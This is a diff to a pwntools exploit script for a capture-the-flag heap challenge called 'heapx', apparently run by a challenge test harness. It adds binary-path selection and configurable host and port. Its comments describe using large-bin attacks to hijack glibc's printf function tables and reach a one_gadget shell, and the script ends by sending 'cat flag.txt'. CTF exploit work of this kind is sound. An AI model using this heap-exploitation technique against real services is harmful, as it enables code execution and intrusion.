@@ -1,12 +1,26 @@
+import os
 from pwn import *
 
-exe = ELF('./publish/heapx')
+# `pwnmake check` runs us from the challenge dir with a `.build/` symlink to the
+# from-source build and a `publish/` symlink to the published files. Prefer the
+# from-source binary (matches what's deployed), fall back to the committed copy;
+# read libc from the publish/ symlink.
+
+def _pick(*cands):
+	for c in cands:
+		if os.path.exists(c):
+			return c
+	return cands[-1]
+
+exe = ELF(_pick(".build/heapx", "heapx"))
 context.binary = exe
 
-p = remote('localhost', 25004)
+HOST = os.environ.get('HOST', 'localhost')
+PORT = int(os.environ.get('PORT', 25004))
+p = remote(HOST, PORT)
 #p = gdb.debug(['./publish/heapx'], gdbscript='continue')
 
-libc = ELF('./publish/libc.so.6')
+libc = ELF("publish/libc.so.6")
 
 MAIN_ARENA = 0x1e8ac0
 MAIN_ARENA_DELTA = 0x60
@@ -93,5 +107,8 @@ g8 = allocate(0x498)
 
 p.sendlineafter(b'> ', f"read {g1}".encode())
 
-p.interactive()
+# The large-bin attacks redirected __printf_function_table/__printf_arginfo_table
+# so the next printf fires the one_gadget -> shell. Grab the flag.
+p.sendline(b'cat flag.txt')
+print(p.recvrepeat(2).decode(errors='replace'))
 
